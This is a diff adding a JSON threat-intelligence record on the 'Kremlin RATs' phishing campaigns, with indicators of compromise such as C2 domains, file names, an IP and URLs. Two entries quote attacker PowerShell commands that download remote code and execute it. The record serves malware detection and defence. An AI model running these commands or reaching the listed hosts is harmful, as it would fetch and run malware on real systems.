@@ -1,0 +1,201 @@
+{
+  "malware_family": "Kremlin RATs",
+  "threat_actor": "previously unknown threat actor from Nigeria",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "A Nigerian threat actor, active since at least 2019, distributes various RATs including NetWire, AgentTesla, and WSHRAT through phishing campaigns. The actor favors Office exploits like CVE-2017-0199 and CVE-2017-11882 for initial access, and uses DDNS domains often containing 'kremlin', 'putin', or 'crimea' for C2 infrastructure.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "PowerShell.exe -ExecutionPolicy Bypass -w hidden -c $c=(New-Object System.Net.WebClient).DownloadString('http://officeservicecorp.biz/lab.jpg');IEX $c",
+      "context": "Executed from malicious macro in Office document to download script.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "$w=(New-Object Net.WebClient);$p=$env:temp+'\\avantfirewall.exe';$w.DownloadFile('https://m.put.re/Qm8He5E4.exe',$p);Start-Process $p",
+      "context": "Base64-decoded PowerShell command from .hta file to download/run payload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "avantfirewall.exe",
+      "context": "Payload saved to %TEMP% directory by PowerShell script.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "wd32PrvSE.wmf",
+      "context": "Malicious OLE object name within RTF document exploiting CVE-2017-11882.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Денсаулық сақтау бойынша анықтамалық жәнедеректер базасы.vbs",
+      "context": "Obfuscated VBS loader extracted from .img file.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "oyii.hta",
+      "context": "Downloader HTA file fetched by CVE-2017-11882 exploit.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "hydro.exe",
+      "context": "AgentTesla payload downloaded by exploit for CVE-2017-0199.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "dns_pattern",
+      "value": "*kremlin*.duckdns.org",
+      "context": "Domain pattern used for C2 infrastructure.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "dns_pattern",
+      "value": "*crimea*.duckdns.org",
+      "context": "Domain pattern used for C2 infrastructure.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "dns_pattern",
+      "value": "*putin*.duckdns.org",
+      "context": "Domain pattern used for C2 infrastructure.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "user_agent",
+      "value": "WSHRAT",
+      "context": "User-Agent used by WSHRAT payload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "WSHRAT"
+    },
+    {
+      "kind": "uri_path",
+      "value": "/is-ready",
+      "context": "C2 check-in URI used by WSHRAT payload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "WSHRAT"
+    },
+    {
+      "kind": "domain",
+      "value": "kremlin-turbo.duckdns.org",
+      "context": "C2 server for WSHRAT on port 3397.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "kremlin-crimea.duckdns.org",
+      "context": "C2 server for NetWire RAT on port 3396.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "kizzoyi.duckdns.org",
+      "context": "C2 server for AsyncRAT on port 8808.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "screw-malwrhunterteams.com",
+      "context": "C2 server for a NanoCore RAT sample.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "putin-malwrhunterteams.com",
+      "context": "Domain registered by actor for Spring 2020 campaign.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "office-cloud-reserve.com",
+      "context": "Server hosting AgentTesla payload 'hydro.exe'.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "ftp.centredebeautenellycettier.fr",
+      "context": "Compromised FTP server used for AgentTesla data exfiltration.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://paste.ee/r/rSrae",
+      "context": "URL hosting next-stage script content for AsyncRAT.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "68.235.38.157",
+      "context": "IP address hosting .hta downloader files.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "pe",
+    "script",
+    "document"
+  ]
+}
